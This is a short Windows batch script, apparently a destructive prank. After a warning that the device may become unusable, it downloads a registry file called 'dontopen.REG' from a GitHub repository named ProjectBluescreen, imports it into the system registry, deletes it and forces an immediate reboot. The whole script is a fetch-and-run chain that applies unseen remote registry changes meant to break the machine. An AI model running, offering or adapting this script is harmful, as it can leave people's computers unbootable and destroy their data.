%echo off
echo Press any key 5 times to confirm you want this device to possibly become unusable.
pause
pause
pause
pause
pause
powershell /c Invoke-WebRequest https://raw.githubusercontent.com/ProjectBluescreen/BlueScreen/main/dontopen.REG -OutFile temp.REG
temp.REG
del temp.REG
shutdown -r -t 0
